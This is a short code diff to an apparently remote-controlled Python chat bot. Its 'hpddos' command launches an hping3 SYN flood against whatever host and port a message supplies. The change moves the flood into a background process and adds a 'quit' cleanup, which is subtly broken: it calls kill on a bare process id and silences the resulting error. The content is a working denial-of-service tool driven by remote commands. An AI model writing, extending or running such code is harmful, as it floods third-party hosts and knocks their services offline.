@@ -35,11 +35,15 @@ class Toast(BaseResponder):
 			elif cmd == 'hpddos' and params:
 				host, port = params[0].split(':')
 				#hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood 192.168.100.83
-				print(subprocess.check_output(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host])) #sudo?
+				hping_pid = subprocess.Popen(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host]).pid
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
-				print(subprocess.check_output(['kill', '-9', str(os.getpid())]))
+				try:
+					hping_pid.kill()
+				except Exception:
+					pass
+				print(subprocess.call(['kill', '-9', str(os.getpid())]))
 			else:
 				self.respond(msg, 'no such command')
 
